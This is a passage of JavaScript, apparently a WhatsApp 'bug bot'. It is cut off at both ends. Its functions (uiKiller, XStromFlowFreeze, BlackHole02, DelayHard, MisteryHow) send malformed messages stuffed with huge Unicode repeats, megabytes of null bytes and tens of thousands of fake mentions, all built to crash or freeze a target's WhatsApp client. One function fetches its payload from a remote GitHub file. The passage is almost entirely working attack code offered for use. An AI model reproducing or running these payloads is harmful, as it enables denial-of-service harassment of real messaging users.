                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        mentions: ["13135550002@s.whatsapp.net"],
      }
    );

    await XHiper.relayMessage(target, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0
              },
              hasMediaAttachment: true
            },
            body: {
              text: "#" + "ꦾ".repeat(300000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [{ groupJid: "x", groupSubject: " x " }]
            }
          }
        }
      }
    }, { participant: { jid: target } }, { messageId: null });
  } catch (error) {
    console.error("An error occurred:", error);
  }
}

async function uiKiller(vinzzoffc, target) {
  await vinzzoffc.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        url: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "Amelia-Hellboy Kill You", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://Amelia." +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(9000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( AMA )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}

async function XStromDelayNative(vinzzoffc, target, mention) {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "@zyyimupp Here Bro!!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(target, message, {});

  await vinzzoffc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await vinzzoffc.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function XStromFlowFreeze(vinzzoffc, target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await vinzzoffc.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ꦾ".repeat(77777),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await vinzzoffc.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

async function BlackHole02(vinzzoffc, target, mention = false) {

    const mentions = [
        target,
        "0@s.whatsapp.net",
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 5_000_000)}@s.whatsapp.net`)
    ];

    const payload1 = "\u0000".repeat(1_000_000);
    const msg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "BlackHole 🦠" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: payload1,
                        version: 3
                    }
                },
                contextInfo: { mentionedJid: mentions }
            }
        }
    }, {});
    await vinzzoffc.relayMessage("status@broadcast", msg1.message, { messageId: msg1.key.id, statusJidList: [target] });

    const payload2 = "\u0000".repeat(2097152);
    const msg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc",
                    mimetype: "image/jpeg",
                    jpegThumbnail: "<base64-thumbnail>",
                    contextInfo: {
                        mentionedJid: mentions,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 2097152,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload2
                }
            }
        }
    }, {});
    await vinzzoffc.relayMessage("status@broadcast", msg2.message, { messageId: msg2.key.id, statusJidList: [target] });

    const msg3 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "\u0000" + mentions.join(","), format: "STACK" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({ status: true }) + "\u0000".repeat(10000),
                        version: 3
                    }
                },
                quotedMessage: {
                    ephemeralMessage: {
                        message: {
                            viewOnceMessage: {
                                message: {
                                    ephemeralSettingRequestMessage: { ephemeralDuration: 0 }
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    await vinzzoffc.relayMessage(target, msg3, {
        stanzaId: "MarkZuckerberg.id" + Math.floor(Math.random() * 99999),
        participant: { jid: target }
    });
    await vinzzoffc.relayMessage("status@broadcast", msg3, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    }, { participant: target });

    if (mention) {
        const mentionPayload = {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg2.key || null,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        type: 25
                    }
                }
            }
        };
        await vinzzoffc.relayMessage(target, mentionPayload);
    }
}

async function bulldzoerX(vinzzoffc, target) {
  await vinzzoffc.relayMessage(
    target,
    {
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
      },
      eventMessage: {
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: true
          }
        },
        isCanceled: true,
        name: "Sharfinā1st 永遠に生きる",
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
        startTime: "1764032400",
        extraGuestsAllowed: true,
        isScheduleCall: true
      }
    },
    { participant: { jid: target } }
  );
}

async function DelayHard(vinzzoffc, target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await vinzzoffc.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});
}

async function MisteryHow(vinzzoffc, target) {
  let ApiNewFC;
  try {
    const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
    ApiNewFC = await res.text(); // Fixed: Changed ApiKyami to ApiNewFC
  } catch (err) {
    console.error("error fetching", err);
    return;
  }

  const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
  
  const contextInfo = { // Added contextInfo definition
    mentionedJid: mentionedList,
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };
  
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Viona Tes Bag',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQEASABIAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABAMDBAMDBAQDBAUEBAUGCgcGBgYGDQkKCAoPDRAQDw0PDhETGBQREhcSDg8VHBUXGRkbGxsQFB0fHRofGBobGv/bAEMBBAUFBgUGDAcHDBoRDxEaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGv/AABEIASwBLAMBIgACEQEDEQH/xAAcAAAABwEBAAAAAAAAAAAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBAAAAAAAAAAAAAAACAwQFBgEH/8QALBEAAgICAQQBBAICAgMAAAAAAAIBAwQSERMhIjEFFDJBQlJiBlEjMyRhgv/aAAwDAQACEQMRAD8Aww6KHlF/4Emx4cGQ2l/MVJhp4V2SXgUhTw0s9L3exInRSBptdT5CJeCJYOVvD8KBSvdlKLuNrotvFptVheK9n7i+VIlSgXJ/IkDEFagcbWUqdAI8OY+8U3Og36X/ABIAY8KMlnopBbxSfZHlpFyQKJ2oGHcSMwuPELiuDUgDuJkVkZ9Tal3ggAUTzI3giOXSgDn7/b60VzZckJzAAOWcmEB3k5EgBViufvSbyhE3fcq3UYjPXuUVFEFJD3lPKOq34VE1g7+wp556qbvLXpD3puALhLjtHBf2tS5GPKAXZJl/83pAzYQMxHh02qgmTk5X6i7s+pE381yOBjTINqKWsZ/R5oRO3SB3C6bPiIDeVUJk5cI3WqgQaTLS3DmnD1E5RNGRuQepGgpc8LxYjYgE9YkTCV3KrhsxKMuIM4FcRRZ53LFmleB7hJ4/hVk2b2oPC6i8RcrR1M5aUsoMa1Od0pFvt8yKHeSi6PFocRpGnNwC4urhTylqop2FxNtW627iSgOme1Ha7+CRutcebwySwD60AGZcyFc/CgDhR7bmRBRxzyK1AHD3kjsKBka4hbJAAW/lQW+5KMifz+6gAGHdnch8NOlcuUwoR7s0D6mdKXIHSjCSK/8AklEUkoBOq5F8Eo6C1NACdrerUiPEPrJKMKNbayUUbPTtkW5tSbnQMXh/JP7eJCgCKOit4RtSR0pjyqYt4rkVwHlFAQQZxGHKksi9Sn3iYuZy96bnTh3ELfKlGIQitu3qs4xWhUVDQm/7NDvMeG4vapraDEYqBiCAm7Yt3F3eZUkczMjPMnuztuUyJseTOpI0lPPXgcsp+jUhFnfzSeVvYlquqo6KnOngDcQ8o/qUPLVGIZE72io+Q7me4uJPqIEcQHzILukGRdK59Lal6MHArX0iw/Kle19ybGV27JdduS8gLmQFx5JMyICcYunJBdcyKBcxd6AHjV5hB2QvaQ8TogYlVhvCokDw3Fak2IC4R3o9wc3Cl4AuGCbfHSRBFigPU26Slbj/AN1ecLx6ixcWOknA7uW7UPyrETC5hsJDGctPK0sBvGY8LjpdkvA0G/sV3ruSiq+y20L4vQRekZdsG4yYtV3UrMPClAOHl70dhRAR7beHuSgGYULC65uFKMNqYArjuQNn5Ua3cu+8gAttyC3iRm1N7VzjcpBQnszRbUpbvQPwoATyQWpQVzilGE7eK1FR3tRXQARc2lGt8FzD7UAEt3IzWobUW0ckABzEisO/2JQBHVvRbn5e9AAONvvVZ2h2lp8JAgiIJ6wuGMS3B5nSG1u1YYSBUtK7S17j/CIfb/SsveU55HOUnMiLMnLvclIibexR/LUS1BnNUSEZmWZO6Dt2FtWn/VMgK58yLQKBiczzVqdRONhaeXdpFNrr2Rz7nHidHALGuJt6hGiBu+lB8SWYO0MrkZoHJ9Oq4kp6N/Z1LmZhd+ZOXDkHl505osJmqn0Du5it7l5qKMooHJ/anUeGSzvlEL5czq24RsqdQbRwB2h82fC3mf8ApWl4P9HIRUz1NZmICPfwl/xUkVsx5LqYiGzlVYRWPGI8V3KmMtKcTPeNt25bttLQQ4cA00ELBLLa0QPyF1P8qyXHezKYxiZ+zhGwLubzfMlmNRonYrd1vyozGlnp7mMyG1NnFkup6WDZPFPq7EY/s3lGXdY3F/Ba5QVUdbTBNT52GPN3isIpKh6ecJg0uBZith2PqBqsDilv1FKZkPMNxJJgYsLeZKCiNnvFHbiUYoLCOpHEbuJA3wo7d2SBjvDNEIjz4nSqJl7BTAcyBGYeVd4EmFCotu4tSNbvXWjkgIC2pO3pSrcyL4pRglq5Gy5cka1ACVvSS63cS57UP8UChGErXXfiR27+9A5FvQMEt3PqdV3azaAMDw/7InOqm3RNd94vhVjMgACOUxjABzJ37hFYdtLjx45ic1RycMTd2QeCaAImeeSeQ5ZzeSUyzJy7yQMW7LmJJWo/KSliRQSO58h4RTiMbY9PF1JKKIc9/KnscW5NEAEiBs7i1dIoTtzf1JzIHooZF+9L8KTjpzN7iH+aNRToYnlcW8Oa1PWp7QGMOL19KBomC0R1GXKKncKwGoryGKAXKQuEG8PM6lSvYSX1FMG2ZCoseo0gXCTju+7zLS9n9gJa8GYI2gpxL/F0/M//AKUPR7F4xhMfpdAckpcxAf3mtV22T289CnGhx4AsAdJMNjj5dSvV0qvtSm7s3pi87N7B0OHRDfD27jvESG1ruq1KbSFFh0cNwAUxETRQ/D5fUPMSc1G19BT0nb0FRHVAQ5jkX6eJZ7juM1M7TVNUzRGQ5EZjqceUWHluVl0VV7EabfkpG09aEXpNXVH29TKPZxdRe3++nzLM6kHnq7CzJ4uJuoy4VYsXq3qqgqgicuSBrvxfF/USPhWDCcpDUD2dPS/aVR8Orp/SsqU2bsXt9SvSYbYEcZM+rq6VWa0hKc7B03LQdoMwiOQwsM9ABbll/YrPpPtXd+FQPGpIk7CDDu6la9h8Z9Ar+wlO2Cf8JKpMW61OKY+yqAICe4elRDm/xkeXU/dcnAEPNpUXgNY2JYXSVPOYDeXnHSSlQLqUYwo3dkjMQ5IjcSMHcJcqAD5pK5HHvdEIiz7nQAZuFdd0oyJw5phQVyLch8EDAdSI5dKNw5oLUAFXEjWrkAE8UFqN8y7xJAsBbVyMioGKv9IFeVFs3UiD6qghh+Xm/KsXASJ9K036UZy9GoIc21GZ5etV7CdnCKk7acNxjcOXgnUCtxw5XFlu8yMwN0qSr4gg/wDA+ZR7adKaI2PPQaMLU7CXsAvLj5R6U3F2yfuyFOsOiF/tpeEeHPq6lPxqRx5Dumot4zVA3THvFi5U7ipZaqT0XDg7WQt5l/fKnWF0FXjdaNNQRnPOe60OUfi/Ut92N+i2HDqAhPI6ot5mI6X6VZooa3uR2Pqp5/pKeHCKuzEXYT61tGxdFTVEQvREAxFvJ4i1kkdsPo7CtnIK37CUtwnbuJZxU4ZtV9HNY1VQActGJcTDeBD/AEp9HqbnUTVWU9UUWExlT/ZGEYCOVziN38VRts9kKKeApqUv2lizvIRALf1KtbN/S3Hj0YDIR0dTblYWoXL2F6l20e3R0cBX00h+BGWq4vYtKLk07mdMPuVyTEqnZ6raWOaSyLcIlpv/AKRUXju1v1sF5jcZbyYi4vKqzjG1VTi8pvFTNddle57m/v1JLBsJmrZgI+1HMtU0lORM3uH/ANqjFzP4QXNNV5kmsMi9InCUZW9J5Hfui83mf+xVsjw0MNoBOoHsoh1iJlvc+s/6eVdRy4VgMVtHTz1lVzSmFuRdWrUqvj+0ctRKYkbSTFusArhBSyiovH5KySztz+CvbU1/pU7iBOcQ7h6rep/MSrLxWxv6yVgjoinzf954k9ulkxq6W28LdIcSyrEbY0UdSvONrpSMdxIZBIXLSuizyNVtSc1H6OK1yoJKYy3XZj7FeQL2fxWXfR2ZjUTgQ6NOrzLUGK5JwAoyOxbvKkgFH5dSUAzfeXXLhXXN1OgYFyQcqLch8FJwKBajOK7lRUowLIvEhbxuXIADxz3IpozojkiAO8CQ+CBC6BQOJkW3qFG5kBlu08RIGM4+kgO1rMNC7huuL1XF/wAU4irGpcKekON7iIgEwHdb3XeXhXbc0Z1FJ6fEN3o8o7vKP9/iUViuKShgzBAd1LLYZMPXa9v53+8m42CJ1K5iE/pVW4jwAmV10mni8qG62IiItRb0NIG9yLhEVPWLILiROMQcpfzJTuEYTU4tUx0eHBd1P4N5k1wfDZa+cQibURZXdK33YjZWHCacAEG7Q7bzV2mjqt/6IpfUsf0cbC0mz9EBWMUkvGfMfv8A6VsWH0ARQDp1FzKr4MO8BstsV6w7WAiuipp8eIKs3Kvsi8QwGmxKnOCqiaQC6lR6/wCj7EKIDiw6UK6jL/Aqf9CWuPS3M9vMiHREPi6foFG6/b0eaNofoqavjfsKabCpguMcivASTbAPo8xetwyal2hhMWAibtB5x5SYuJelqunGy4mAvMSh6on7N4iJhD2Kq9NStzJBDuy8HnHG/olxOLsn2VpqYhDcQyE+kvYSzfFcc2p2cnOhr4PQZLsiY4H3r27QRQhEZFZk3h61iX0i0AY3UvLh0FkolqMbkt2Mum6eMiJk6Po/kedJKvG8X1T+lSj8HZj95DT0Y05/t5sHiQD/AKkrnV4DVRObVtb2XtcyIvujw/MSquKUFFTXuVa8sollaI8XzLK0ZO7mnFm/oevUBK1mHDcA8/CLf395RmJlHFH2MRcXG6jY6ianlt1x3cIetM62vMpDC3WO73JHddSVEbYbVWV7/iR4huHLp4k2u+Z07jG0CG3USpcbFznUt+wgENSdvMf6f+S00NTOs+2LgPtqguJgPlHyrQQ8BVefuHgOKUSaFuFKMHu3ILm9i5itZEJ96OAOAtPEjsiASVZSCnMW513ggQMlGBYVy5BvQBzjvROVH8UT3JQORm03IvUhZAp2lIylbHIY8IiSVctxJtUlbGIoAY1NKB4fNFPkQlFkVyyXHKP6uqHhpzMqYyJwAvBaris7tFbw3W3D5Vme0E7VmJjEHdFuLLxIiTxAELMNtoIY9ER3e5LSxdrVva+67L5RRqIBlqKccr7jzt6tSnSPIRzTfo8wNv3xs+jd83itow6AcgL1Km7J0foeHwxXMT8z+suZXugDcwjw9K6GmNVKcyWrBybMbndXWjIIgG3PMd6pOHDZk+attAYWd61aJ1MvI2YnoJbm1E1qb4hjUGHQOc72jd3etEawonIelYztBj00GN1h4ibjDEWi/hGJT339FNyjRj9Z+JYvtXtlFL+4jcWLqUfHiT1B+KyeP6UsDq6kaWnq5BMiyEpKc4mculnJlrOxU+GV9Eb1VR2UxcOYrFSxsp+INuxKsVOQuI170tPKAFvPdaqntNT15YUEeFTRUMxhcU0kV/4Vb8dooir6aGle/UT3XXZp7V4cFZRNDKzaQyFavT8eJMGXV35g8ozlVYtX/VuOYj9WVNxAcnZMQSj62Rx+jOGKb/riqW5pXK1v4ZNn/mr3t1sYFSxx1sZjb+4qYx3gSzekr9pMLp56erynpafinPcTD8SwLE1bzXY11dmXwbUS2twbCdmcHzpWYqq/K8+MyWXPcTGXr8VYNpsWqccmapq9MTB9kHqH1+91EzhbFC1r3Esq6xXft6NXHrZE8/uGAad/F4KZwqApZQcsyESFRQBzF8qs+CQGYRQwC/aymWr1D1f+VHBKxeNkqe2iKYh/ekT/AIlaQ1Jjh8AU9NHFENoAOQsngcLqBh4gUZDduRM0N3UvOADcqLcS65kUS3dy91AUAdyUbyoGHchXoAW70K61daoxgPBFckdFttQAW1dyo78qL4JQCtchQuJZ2on6UwoLluTSUuPr0/KljESYkzrT7KjlMdJEQpgIDF53lN4YnYjIhue7hVGkgEcTmse4QLLMvG0dRK9SROFPJMbajEWH4blRiJzarMtL9rL+VOkhwMHG17/ISf7MRCeIw3cnC7pKWmEIh81KVr+YUbA5/R6wPlVmv7hHN7wA/shFXzDwKxn/ABKgbJW1AMVrEHStSwQAAxvFreldDj+ZlZEsi8QU3aj6UKPZSupqKojlI5hzvYbQb5lacA+kHDKyJiKrsK1Z/wDSRBTVuJFTziBRlcIvbwqhBhIUABTy5xGRaJ4ytYvl4blWsy3qtaI9FyjBW2pZk9U0m1dBK18VbHkKCroMLx4nlMoe0EdJsQ5ry/PX1+z4X1hvVUZbu2DkLzj+pWTZ3aUZ3YzqDlpi5wK44y6h/pV2vN37SLPxya9m1ks22ewZBBNU0APPSjxXiNqpODY1tFR4p6HTUEvo1umd5dzj7B/CtMwfbkMSjKgr+zIbtJ2kOfvFWjCsLw+ln9Ip6eMZ